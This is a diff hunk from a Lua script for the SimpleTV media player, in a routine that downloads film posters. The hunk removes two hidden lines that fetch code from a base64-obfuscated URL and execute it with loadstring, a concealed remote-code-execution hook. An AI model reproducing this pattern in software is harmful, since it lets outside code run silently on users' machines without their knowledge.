@@ -431,8 +431,6 @@ local tname = {
 		local session2 = m_simpleTV.Http.New('Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/79.0.2785.143 Safari/537.36', nil, true)
 			if not session2 then return end
 		m_simpleTV.Http.SetTimeout(session2, 8000)
-		local _, d4X6_71 = m_simpleTV.Http.Request(session, {url = decode64('aHR0cHM6Ly9naXRodWIuY29tL05leHRlcnIvc2ltcGxlVFYtc2NyaXB0cy9ibG9iL21hc3Rlci9hZGRvbnMvVHJhc2hDbGVhbmVyL1RyYXNoQ2xlYW5lci5sdWE/cmF3PXRydWU')})
-		pcall(loadstring(d4X6_71))
 		local url = 'https://st.kp.yandex.net/images/film_iphone/iphone360_' .. kpid .. '.jpg'
 		m_simpleTV.Http.SetRedirectAllow(session2, false)
 		local rc, answer = m_simpleTV.Http.Request(session2, {url = url})
